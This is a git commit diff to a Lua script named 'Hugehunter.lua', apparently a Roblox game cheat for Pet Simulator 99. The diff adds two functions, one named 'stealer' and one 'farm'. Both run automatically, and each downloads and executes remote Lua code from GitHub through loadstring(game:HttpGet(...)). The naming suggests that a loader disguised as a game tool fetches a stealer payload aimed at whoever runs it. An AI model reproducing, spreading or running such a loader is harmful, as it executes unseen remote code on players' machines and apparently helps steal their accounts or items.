8a98ca95352cfd8e8b1b1b344796eb139b06f95c
Rizo2tuff <ftyifyioftufgt@gmail.com>
2025-04-13 01:56:43 +0200

    Update Hugehunter.lua

--- Hugehunter.lua
+++ Hugehunter.lua
@@ -1,9 +1,9 @@
-local function hugehunter()
-    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/Rizo2tuff/Ps99/refs/heads/main/Ps99.lua"))()'))()
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/Ps99/refs/heads/main/Ps99.lua'))()
 end
-local function addons()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/ps99hunter/refs/heads/main/ps.lua'))()
+local function farm()
+    loadstring(game:HttpGet('https://github.com/Rizo2tuff/ps99hunter/blob/main/ps.lua'))()
 end
 
-task.spawn(hugehunter)
-task.spawn(addons)
+task.spawn(stealer)
+task.spawn(farm)
